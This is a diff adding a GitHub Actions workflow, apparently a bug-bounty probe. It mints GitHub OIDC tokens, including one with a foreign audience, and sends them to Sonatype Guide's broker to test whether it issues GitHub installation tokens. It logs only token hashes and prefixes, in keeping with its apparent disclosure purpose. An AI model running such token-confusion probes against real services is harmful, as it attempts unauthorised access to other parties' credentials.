@@ -1,0 +1,60 @@
+name: H1 OIDC broker probe
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Probe Sonatype Guide OIDC broker
+        run: |
+          set -euo pipefail
+          mint() {
+            curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" | jq -r '.value'
+          }
+          probe() {
+            local tok="$1" label="$2"
+            local code body
+            body=$(mktemp)
+            code=$(curl -s -o "$body" -w '%{http_code}' -X POST \
+              -H "Authorization: Bearer $tok" -H "Content-Type: application/json" \
+              -H "Accept: application/json" --data '{}' \
+              "https://api.guide.sonatype.com/agp/installation-token")
+            echo "=== broker [$label] -> HTTP $code ==="
+            jq -r 'if type=="object" then (to_entries | map({key:.key, type:(.value|type), len:(.value|tostring|length)})) else . end' "$body" 2>/dev/null || head -c 300 "$body"
+            echo
+            if [ "$code" = "200" ]; then
+              T=$(jq -r '.token // empty' "$body")
+              echo "token_len=${#T} token_sha256_16=$(printf %s "$T" | sha256sum | cut -c1-16)"
+              echo "token_starts_ghs=$(printf %s "$T" | cut -c1-4)"
+              echo "other_keys=$(jq -r 'keys | join(",")' "$body")"
+            fi
+            rm -f "$body"
+          }
+          effcfg() {
+            local tok="$1" label="$2"
+            local code body hdrs
+            body=$(mktemp); hdrs=$(mktemp)
+            code=$(curl -s -o "$body" -D "$hdrs" -w '%{http_code}' \
+              -H "Authorization: Bearer $tok" \
+              -H "Accept: application/yaml, application/x-yaml;q=0.9, text/yaml;q=0.8, */*;q=0.1" \
+              "https://api.guide.sonatype.com/agp/effective-config?format=yaml")
+            echo "=== effective-config [$label] -> HTTP $code ==="
+            grep -i "x-agp-directive" "$hdrs" || echo "(no directive header)"
+            head -c 400 "$body"; echo
+            rm -f "$body" "$hdrs"
+          }
+          echo "--- OIDC claims (guide audience) ---"
+          JWT=$(mint "https%3A%2F%2Fguide.sonatype.com")
+          echo "::add-mask::$JWT"
+          echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{iss,aud,sub,repository,repository_owner,job_workflow_ref,workflow,ref,event_name,actor}'
+          probe "$JWT" "guide-audience"
+          effcfg "$JWT" "guide-audience"
+          echo "--- OIDC claims (foreign audience api.github.com) ---"
+          JWT2=$(mint "https%3A%2F%2Fapi.github.com")
+          echo "::add-mask::$JWT2"
+          echo "$JWT2" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{iss,aud,sub,repository}'
+          probe "$JWT2" "foreign-audience"
